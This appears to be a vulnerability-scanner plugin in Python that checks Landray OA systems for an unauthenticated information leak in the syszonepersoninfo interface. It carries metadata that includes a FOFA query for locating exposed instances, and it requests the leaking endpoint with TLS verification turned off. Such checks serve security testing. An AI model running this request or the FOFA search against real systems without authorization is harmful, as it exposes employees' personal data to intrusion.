#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/al4Dzr2paSvH4pI1yrKzTA',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '蓝凌OA syszonepersoninfo 接口信息泄露',

      'level'     :   'high',

      'FOFA'      :   'app="Landray-OA系统"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/4/8',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/sys/zone/sys_zone_personInfo/sysZonePersonInfo.do?.js?&method=searchPerson&orderby&ordertype=up&rowsize=20&s_ajax=true'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'columns.*?title.*?property.*?col.*?value',res.text,re.S):
      # ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret